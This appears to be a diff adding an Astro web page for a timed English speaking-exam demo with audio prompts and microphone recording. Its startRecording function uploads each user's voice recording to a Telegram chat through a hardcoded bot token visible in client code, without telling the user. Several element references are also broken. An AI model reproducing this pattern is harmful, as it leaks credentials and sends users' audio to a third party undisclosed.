@@ -1,0 +1,831 @@
+---
+import Layout from '../../../layouts/Layout.astro'
+import 'bootstrap/dist/css/bootstrap.css';
+import 'mdb-ui-kit/css/mdb.min.css'
+import 'font-awesome/css/font-awesome.min.css'
+---
+<style>
+    .microphone-wave {
+width: 30px;
+height: 30px;
+border-radius: 50%;
+background-color: #e60606;
+position: relative;
+animation: blink-mic 1s linear infinite;
+margin-top: 30px;
+}
+
+@keyframes blink-mic {
+0% {
+  opacity: 0;
+}
+50% {
+  opacity: 1;
+}
+100% {
+  opacity: 0;
+}
+}
+
+
+
+</style>
+
+
+<Layout title='Demo Speaking'>
+
+        <!---welcome--->
+<div id="welcome">
+    <div class="container d-flex justify-content-center align-items-center" style="min-height: 100vh;">
+    <div class="card shadow" style="width: 500px;">
+        <div class="card-header"><h3 class="text-dark text-center">Multi Level Speaking</h3></div>
+        <div class="card-body">
+         <h5 class="text-center">Welcome to Speaking Exam!</h5>
+         <p>Test contains the followings:</p>
+          <ul>
+            <li>Part 1: 6 questions</li>
+            <li>Part 2: Cue Card (duration: 2 minutes)</li>
+            <li>Part 3: 5 questions (related to Part 2)</li>
+          </ul>
+          <p class="text-dark text-center fw-bold">If you are ready Please, hit the "Start" button below!</p>
+           <center><button onclick="step0()" class="btn btn-primary px-5 py-2" style="font-size: 17px;">Start</button></center>
+        </div>
+    </div>
+</div>
+</div>
+
+<!----welcome ends-->
+
+
+
+<div id="quizBar" style="display: none;">
+<div class="navbar navbar-expand-lg navbar-light bg-primary shadow">
+    <div class="container-fluid">
+        <a class="navbar-brand text-light fw-bold" href="#">Multi Level Speaking</a>
+        <div class="timer-bar text-light fw-bold" id="full-screen" onclick="toggleFullScreen()"><i class="fa fa-expand"></i></div>
+        </div>
+</div> 
+
+<div class="text-center my-5">
+    <span id="part1" class=" badge px-3 py-2 bg-success level-one fw-bold text-light mx-3">Part 1</span>
+    <span id="part2" class=" badge px-3 py-2  bg-primary level-two fw-bold text-light mx-3 rounded">Part 2</span>
+    <span id="part3" class=" badge  bg-primary px-3 py-2 level-three fw-bold text-light mx-3 rounded">Part 3</span>
+  </div>
+ <section class="container my-3 pt-2 shadow-sm border-1" style="border: 1px solid lightgrey; border-radius: 5px;">
+ <div class="row">
+   <div class="col-md-5 py-3">
+     <div class="card">
+       <div class="card-body">
+         <div class="header-question d-flex justify-content-between align-items-center">
+           <span class="badge rounded-pill text-light bg-primary border-0 px-5 py-2">Question# <span id="que-id"></span></span>
+           <div>
+           <i class="fa fa-volume-up text-primary mx-1"></i><input class="text-dark" type="range" id="audio_volume" min="0" max="1" step="0.01" name=""></div>
+         </div>
+         <hr>
+         <div class=" quiz-container mt-3 d-flex justify-content-center align-items-center">
+           <button class="btn btn-primary px-3 py-1 mx-3" onclick="sizeDown()">A-</button>
+            <button class="btn btn-primary px-3 py-1 mx-3" onclick="sizeUp()">A+</button>
+         </div>
+         <hr>
+         <div id="question-bar">
+         </div>
+         <audio src="/static/audios/test1/beep.mp3" id="beep"></audio>
+       </div>
+     </div>
+   </div>
+   <!----Right side--->
+   <div class="col-md-7 py-3">
+     <div class="card" id="card">
+       <div class="card-body">
+         <div class="header-question d-flex justify-content-around align-items-center">
+           <button class="btn btn-primary w-100 fw-bold py-1">
+            <i class="fa fa-stopwatch text-light" style="font-size:23px"></i><span class="text-light px-2" id="timer" style="width:50px; font-size: 23px;"></span>
+           </button>
+         </div>
+         <div class="hidden recorder">
+         <span class="circle text-center"></span>
+         <center><div id="rec-icon" class="microphone-wave"></div>
+         <p id="rec-text" class="text-center">Recording...</p></center>         
+       </div>
+     </div>
+   </div>
+ </div>
+ </section>
+</div>
+
+
+    
+
+
+
+<!--------------Result ends here-------------------------->
+                   
+                        <audio src="/static/demo/1.mp3" id="audio_1"></audio>
+                        </div>
+                        <audio src="/static/demo/2.mp3" id="audio_2"></audio>
+                        <audio src="/static/demo/3.mp3" id="audio_3"></audio>
+                        <audio src="/static/demo/4.mp3" id="audio_4"></audio>
+                        <audio src="/static/demo/5.mp3" id="audio_5"></audio>
+                        <audio src="/static/demo/6.mp3" id="audio_6"></audio>
+                        <audio src="/static/demo/part2/intro.mp3" id="audio_7"></audio>
+                        <audio src="/static/demo/part2/1.mp3" id="audio_8"></audio>
+                        <audio src="/static/demo/part3/intro.mp3" id="audio_9"></audio>
+                        <audio src="/static/demo/part3/1.mp3" id="audio_10"></audio>
+                        <audio src="/static/demo/part3/2.mp3" id="audio_11"></audio>
+                        <audio src="/static/demo/part3/3.mp3" id="audio_12"></audio>
+                        <audio src="/static/demo/part3/4.mp3" id="audio_13"></audio>
+                        <audio src="/static/demo/part3/5.mp3" id="audio_14"></audio>
+                        <audio src="/static/demo/part3/end.mp3" id="audio_15"></audio>
+                        
+                
+</div>
+
+</Layout>
+
+
+<script is:inline>
+
+const part1=document.getElementById("quizBar");
+const section1=document.getElementById("part1");
+const section2=document.getElementById("part2")
+const section3=document.getElementById("part3")
+const welcome=document.getElementById("welcome")
+const que=document.getElementById("question-bar");
+const audio1=document.getElementById("audio_1");
+const audio2=document.getElementById("audio_2");
+const audio3=document.getElementById("audio_3");
+const audio4=document.getElementById("audio_4");
+const audio5=document.getElementById("audio_5");
+const audio6=document.getElementById("audio_6");
+const audio7=document.getElementById("audio_7");
+const audio8=document.getElementById("audio_8");
+const audio9=document.getElementById("audio_9");
+const audio10=document.getElementById("audio_10");
+const audio11=document.getElementById("audio_11");
+const audio12=document.getElementById("audio_12");
+const audio13=document.getElementById("audio_13");
+const audio14=document.getElementById("audio_14");
+const audio15=document.getElementById("audio_15");
+const recicon=document.getElementById("rec-icon")
+const rectext=document.getElementById("rec-text")
+const beep=document.getElementById("beep");
+const timer=document.getElementById("timer");
+const que_id=document.getElementById("que-id");
+const loader =document.getElementById("loader")
+let recorder, audio_stream;
+
+
+recicon.style.display="none"
+rectext.style.display="none"
+
+
+
+//Recorder
+//recognition.start()
+function startRecording() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function (stream) {
+      audio_stream = stream;
+      recorder = new MediaRecorder(stream);
+
+      // when there is data, compile into object for preview src
+      recorder.ondataavailable = function (e) {
+        const url = URL.createObjectURL(e.data);
+        const formData = new FormData();
+        formData.append('audio', e.data, 'recording.mp3');
+        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
+          method: 'POST',
+          body: formData
+        })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      };
+      recorder.start();
+
+    });
+}
+
+
+function stopRecording() {
+    recorder.stop();
+  }
+
+ 
+
+//Scale UpandDown
+var TextSize=document.getElementById("question-bar");
+ function sizeUp(){
+    var style = window.getComputedStyle(TextSize, null).getPropertyValue('font-size');
+    var fontSize = parseFloat(style);
+    TextSize.style.fontSize=(fontSize+1)+'px'
+ }
+
+ function sizeDown(){
+    var style = window.getComputedStyle(TextSize, null).getPropertyValue('font-size');
+    var fontSize = parseFloat(style);
+    TextSize.style.fontSize=(fontSize-1)+'px'
+ }
+
+ //Fullscreen
+ function toggleFullScreen() {
+	if (!document.fullscreenElement) {
+	  document.documentElement.requestFullscreen();
+	  document.getElementById("full-screen").innerHTML=`<i class="fa fa-compress"></i>`
+	} else if (document.exitFullscreen) {
+	  document.exitFullscreen();
+	 document.getElementById("full-screen").innerHTML=`<i class="fa fa-expand"></i>`
+	}
+  }
+  
+
+
+//Step1
+function step0() {
+	welcome.style.display="none";
+	part1.style.display="block"
+	que.innerHTML="What do you do in your free time?";
+	que_id.innerHTML=1
+	document.getElementById("result").style.display="none"
+	audio1.play();
+	audio1.addEventListener("ended", startCountdown)
+
+	// Define a function to start the 5-second countdown
+function startCountdown() {
+	let count = 5;
+	timer.innerHTML += `${count} seconds`;
+	const interval = setInterval(() => {
+	  count--;
+	  timer.innerHTML = `${count} seconds`;
+	  if (count <= 0) {
+		beep.play();
+		clearInterval(interval);
+		start30SecondCountdown();
+	  }
+	}, 1000);
+  }
+
+	// Define a function to start the 30-second countdown
+	function start30SecondCountdown() {
+		
+		recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+		let count = 30;
+		timer.innerHTML = ` ${count}  LEFT`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} LEFT`;
+		  if (count <= 0) {
+			
+		recicon.style.display="none"
+		rectext.style.display="none"
+			timer.innerHTML="";
+			clearInterval(interval);
+			step1();	
+			
+		  }
+		}, 1000);
+	  }
+	
+}
+
+//Step1 fun
+function step1(){
+    startRecording();
+	que.innerHTML="Do you have a busy social life?";
+	que_id.innerHTML=2
+	document.getElementById("result").style.display="none"
+	audio2.play();
+	audio2.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+		recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			 
+			  timer.innerHTML = `${count} LEFT`;
+			  if (count <= 0) {	
+			recicon.style.display="none"
+			rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step2();
+				
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step2
+
+function step2(){
+	que.innerHTML="Has your life changed much in the last year?";
+	que_id.innerHTML=3
+	document.getElementById("result").style.display="none"
+	audio3.play();
+	audio3.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step3();		
+			  }
+			}, 1000);
+		  }
+}
+
+//step3
+
+function step3(){
+	que.innerHTML="What would you like to change about your lifestyle?";
+	que_id.innerHTML=4
+	document.getElementById("result").style.display="none"
+	audio4.play();
+	audio4.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+
+				timer.innerHTML="";
+				clearInterval(interval);
+				step4();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step4
+
+function step4(){
+	que.innerHTML="Do you enjoy your current stage of life?";
+	que_id.innerHTML=5
+	document.getElementById("result").style.display="none"
+	audio5.play();
+	audio5.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step5();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step5
+
+function step5(){
+	que.innerHTML="What do you dislike about your current stage of life?";
+	que_id.innerHTML=6
+	document.getElementById("result").style.display="none"
+	audio6.play();
+	audio6.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				part2();
+				document.getElementById("result").style.display="none"
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//part2 intro
+
+function part2(){
+	que.innerHTML='';
+	que_id.innerHTML=''
+	audio7.play();
+	section1.innerHTML=`<i class="fa fa-check"></i>`;
+	section2.classList.add("bg-success");
+	audio7.addEventListener("ended", step6);
+}
+
+//step6
+
+function step6(){
+	que.innerHTML=`<p><b>Describe a healthy lifestyle you know.</b></p><p>You should say:</p><ul><li>What is it?</li><li>How do you know it?</li><li>When do you do it?</li><li>And explain why you think it is healthy.</li></ul><br><textarea class="form-control" id="exampleFormControlTextarea1" rows="3" placeholder="Izoh yozish uchun"></textarea>`;
+	que_id.innerHTML=7
+	audio8.play();
+	audio8.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 60;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+		document.getElementById("result").style.display="block"
+			let count = 120;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				part3();
+				document.getElementById("result").style.display="none"
+			  }
+			}, 1000);
+		  }
+}
+
+
+//part3 intro
+
+function part3(){
+	que.innerHTML='';
+	que_id.innerHTML=''
+	audio9.play();
+	section1.innerHTML=`<i class="fa fa-check"></i>`;
+	section2.innerHTML=`<i class="fa fa-check"></i>`;
+	section3.classList.add("bg-success");
+	audio9.addEventListener("ended", step7);
+}
+
+
+//step7
+
+
+function step7(){
+	que.innerHTML="What are some ways that people can quickly make their lives better?";
+	que_id.innerHTML=8
+	audio10.play();
+	audio10.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step8();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+
+
+//step8
+
+function step8(){
+	que.innerHTML="What are the best ways to achieve these?";
+	que_id.innerHTML=9
+	audio11.play();
+	audio11.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step9();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step9
+
+function step9(){
+	que.innerHTML="Do you agree that we learn best from our mistakes?";
+	que_id.innerHTML=10
+	audio12.play();
+	audio12.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step10();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step10
+
+function step10(){
+	que.innerHTML="What’s the best way to gain experience in life?";
+	que_id.innerHTML=11
+	audio13.play();
+	audio13.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				step11();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+
+//step11
+
+
+function step11(){
+	que.innerHTML="What are the important qualities of a good friend?";
+	que_id.innerHTML=12
+	audio14.play();
+	audio14.addEventListener("ended", startCountdown);
+	//countdown 5 sec
+	function startCountdown() {
+		let count = 5;
+		timer.innerHTML += `${count} seconds`;
+		const interval = setInterval(() => {
+		  count--;
+		  timer.innerHTML = `${count} seconds`;
+		  if (count <= 0) {
+			beep.play();
+			clearInterval(interval);
+			start30SecondCountdown();
+		  }
+		}, 1000);
+	  }
+	
+		// Define a function to start the 30-second countdown
+		function start30SecondCountdown() {
+			recicon.style.display="block"
+		rectext.style.display="block"
+			let count = 30;
+			timer.innerHTML = ` ${count} sec LEFT`;
+			const interval = setInterval(() => {
+			  count--;
+			  timer.innerHTML = `${count} sec LEFT`;
+			  if (count <= 0) {
+				recicon.style.display="none"
+		rectext.style.display="none"
+				timer.innerHTML="";
+				clearInterval(interval);
+				examEnd();
+		
+			  }
+			}, 1000);
+		  }
+}
+
+function examEnd(){
+	audio15.play();
+	que.innerHTML='';
+	que_id.innerHTML='';
+	preview .style.display="block";
+	downloadAudio .style.display="block";
+	stopRecording();
+	audio15.addEventListener("ended", ()=>{
+        window.location.href="/tests/demo/result"
+    });
+	
+}
+
+
+</script>
